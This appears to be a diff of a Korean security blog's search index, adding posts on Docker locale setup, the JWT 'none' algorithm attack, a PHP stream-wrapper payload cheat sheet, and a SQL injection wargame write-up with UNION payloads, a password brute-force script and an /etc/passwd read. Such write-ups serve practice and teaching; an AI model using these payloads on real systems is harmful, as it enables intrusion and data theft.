@@ -4,6 +4,106 @@
   
     
     <entry>
+      <title>(ko) Docker Language Setting</title>
+      <link href="2020/04/22/dockerset-200422/"/>
+      <url>2020/04/22/dockerset-200422/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-설정-변경-사항"><a href="#1-설정-변경-사항" class="headerlink" title="1. 설정 변경 사항"></a>1. 설정 변경 사항</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install locales</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANGUAGE=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">export</span> LANG=ko_KR.UTF-8</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">locale-gen ko_KR ko_KR.UTF-8</span><br><span class="line">update-locale LANG=ko_KR.UTF-8</span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p>근데 한글화가 필요하면, 도커 빌드 때 미리 해두는게 솔직히 편하다.. 그래서 아래에 도커 빌드 설정도 첨부해보려 한다.</p><ul><li>Dockerfile</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RUN apt-get install language-pack-ko -y</span><br><span class="line">RUN apt-get install fonts-nanum -y</span><br><span class="line">RUN apt-get install fonts-nanum-coding -y</span><br><span class="line"></span><br><span class="line">RUN locale-gen ko_KR.UTF-8</span><br><span class="line">ENV LANG ko_KR.UTF-8</span><br><span class="line">ENV LANGUAGE ko_KR.UTF-8</span><br><span class="line">ENV LC_ALL ko_KR.UTF-8</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docker </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Dockerfile, Docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JWT None Type Injection</title>
+      <link href="2020/04/22/jwtinjection-200422/"/>
+      <url>2020/04/22/jwtinjection-200422/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-JWT-JSON-WEB-TOKEN"><a href="#1-JWT-JSON-WEB-TOKEN" class="headerlink" title="1. JWT(JSON WEB TOKEN)"></a>1. JWT(JSON WEB TOKEN)</h3><p>JWT(JSON WEB TOKEN) 란, 정보를 안전하게 전송하기 위해 개발된 RFC 7519 의 웹 표준 입니다.</p><p>JSON 객체를 통해 “self-contained” 방식으로 데이터를 전송합니다.</p><hr><h3 id="2-JWT-TOKEN"><a href="#2-JWT-TOKEN" class="headerlink" title="2. JWT TOKEN"></a>2. JWT TOKEN</h3><p>JWT는 아래와 같은 형태를 가지고 있고,</p><p>Header, Signature, Payload 3개의 부분으로 나뉘어져 있고 이는 .(dot) 으로 구분됩니다.</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiamh5ZW9uIn0.QmGHY7ZS7SmWSy_VFr93F342f1jIEAv_WuK_gHKbyL8</p><p>헤더(Header) 에는 alg(암호화 알고리즘), typ(token type) 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>두번째 부분인 페이로드(Payload) 부분에는 토큰의 클레임(Claim) 즉, 객체나 데이터 값이 들어가게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;name&quot;: &quot;jhyeon&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>세번째는 서명(Signature)가 들어갑니다. 서명에는 암호 알고리즘에 대한 정보가 들어가는데,</p><p>이러한 서명은 중간자에 의해 변조되지 않았다는 걸 증명 또는 검증하기 위해 사용합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>위와 같이 세가지 부분을 각각 BASE64 인코딩을 통하여 JWT 토큰 값으로 사용하게 됩니다.</p><hr><h3 id="3-How-to-JWT-None-Type-Attack"><a href="#3-How-to-JWT-None-Type-Attack" class="headerlink" title="3. How to JWT None Type Attack?"></a>3. How to JWT None Type Attack?</h3><p>JWT None Type Attack 란, JWT 토큰의 헤더 부분 alg(암호화 알고리즘) 을 조작함으로써 발생하는 공격입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>일반적인 JWT 토큰에 대한 암호화 알고리즘은 HS256과 같이 형태를 가지고 있는데,</p><p>이 알고리즘을 “None” 타입으로 변조하여 Signature(검증) 부분을 우회할 수 있게 되므로, 잘못된 방법으로 JWT 토큰을 사용한다면 취약점이 발생할 수 있습니다.</p><p>따라서, 알고리즘을 조작하여 JWT 토큰을 변조하지 못하도록 토큰 생성시에 임의의 secret-key 를 사용하는 것이 안전합니다.</p><ul><li>참고 : <a href="https://jwt.io/">https://jwt.io</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web, JWT </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>php wrapper</title>
+      <link href="2020/04/22/phpwrapper-200422/"/>
+      <url>2020/04/22/phpwrapper-200422/</url>
+      
+        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">expect://expect://ls</span><br><span class="line">php:filterphp://filter/convert.base64-encode/resource=index.php</span><br><span class="line">zip://zip://filename.zip<span class="comment">#webshell.php</span></span><br><span class="line">data://data://text/plain;base64,&#123;RCE CODE HERE&#125;</span><br><span class="line">php://input<span class="built_in">echo</span> base64_encode(file_get_contents(<span class="string">&quot;filename&quot;</span>));</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web, PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mprotect Exploitation</title>
+      <link href="2020/04/22/pwn-mprotect-200422/"/>
+      <url>2020/04/22/pwn-mprotect-200422/</url>
+      
+        <content type="html"><![CDATA[<h3 id="1-참고-링크-Notion"><a href="#1-참고-링크-Notion" class="headerlink" title="1. 참고 링크(Notion)"></a>1. 참고 링크(Notion)</h3><ul><li>Notion : <a href="https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301">https://www.notion.so/jhyeon/MProtect-Exploitation-4443676548a149f4b5468e22b7374301</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Pwnable </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Pwn, Mprotect, Shellcode, Exploitation </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>angstorm ctf 2020 Write up</title>
       <link href="2020/04/10/angstormctf-200410/"/>
       <url>2020/04/10/angstormctf-200410/</url>
@@ -46,6 +146,31 @@
         <tags>
             
             <tag> Web, CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>zixem challenge Write up</title>
+      <link href="2020/04/10/zixemchall-200410/"/>
+      <url>2020/04/10/zixemchall-200410/</url>
+      
+        <content type="html"><![CDATA[<p>Site : <a href="https://www.zixem.altervista.org/SQLi/">https://www.zixem.altervista.org/SQLi/</a></p><hr><h3 id="1-LEVEL-1"><a href="#1-LEVEL-1" class="headerlink" title="1. LEVEL-1"></a>1. LEVEL-1</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="2-LEVEL-2"><a href="#2-LEVEL-2" class="headerlink" title="2. LEVEL-2"></a>2. LEVEL-2</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showprofile<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="3-LEVEL-3"><a href="#3-LEVEL-3" class="headerlink" title="3. LEVEL-3"></a>3. LEVEL-3</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">item<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span>unionon<span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,version(),<span class="number">4</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="4-LEVEL-4"><a href="#4-LEVEL-4" class="headerlink" title="4. LEVEL-4"></a>4. LEVEL-4</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ebookid<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,version(),<span class="number">5</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="5-LEVEL-5"><a href="#5-LEVEL-5" class="headerlink" title="5. LEVEL-5"></a>5. LEVEL-5</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">2000</span>):</span><br><span class="line">param = <span class="string">&quot;http://www.zixem.altervista.org/SQLi/login_do.php?pass=&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">r = requests.get(param)</span><br><span class="line"><span class="built_in">print</span> param</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Brute Force&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;found key: &quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><hr><h3 id="6-LEVEL-6"><a href="#6-LEVEL-6" class="headerlink" title="6. LEVEL-6"></a>6. LEVEL-6</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serial<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">and</span><span class="operator">%</span><span class="number">201</span><span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>id,teacher,teacher_age,price<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>teachers<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>id<span class="operator">=</span><span class="number">11</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><hr><h3 id="7-LEVEL-7"><a href="#7-LEVEL-7" class="headerlink" title="7. LEVEL-7"></a>7. LEVEL-7</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,version(),<span class="number">3</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-LEVEL-8"><a href="#8-LEVEL-8" class="headerlink" title="8. LEVEL-8"></a>8. LEVEL-8</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="operator">%</span><span class="number">09</span><span class="keyword">union</span><span class="operator">%</span><span class="number">09</span>seselectlect<span class="operator">%</span><span class="number">091</span>,version(),<span class="number">3</span>;<span class="comment">--%09-</span></span><br></pre></td></tr></table></figure><hr><h3 id="9-LEVEL-9"><a href="#9-LEVEL-9" class="headerlink" title="9. LEVEL-9"></a>9. LEVEL-9</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>&quot;../etc/passwd&quot;,<span class="number">2</span>;<span class="comment">--%20-</span></span><br></pre></td></tr></table></figure><hr><h3 id="10-LEVEL-10"><a href="#10-LEVEL-10" class="headerlink" title="10. LEVEL-10"></a>10. LEVEL-10</h3><ul><li>php uuencode -&gt; base64 encode</li></ul><p>x=PywiIVU7RkVPO0IhUzk2UUU4VzBALDJRVjk3KVM6Nl1OKiJEWysyVEArMGBgCmAK</p><hr><h3 id="ALL-CLEAR"><a href="#ALL-CLEAR" class="headerlink" title="ALL CLEAR"></a>ALL CLEAR</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> Wargame </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Web, Wargame </tag>
             
         </tags>
       
@@ -182,7 +307,7 @@
       
       <categories>
           
-          <category> Docx </category>
+          <category> Web </category>
           
       </categories>
       
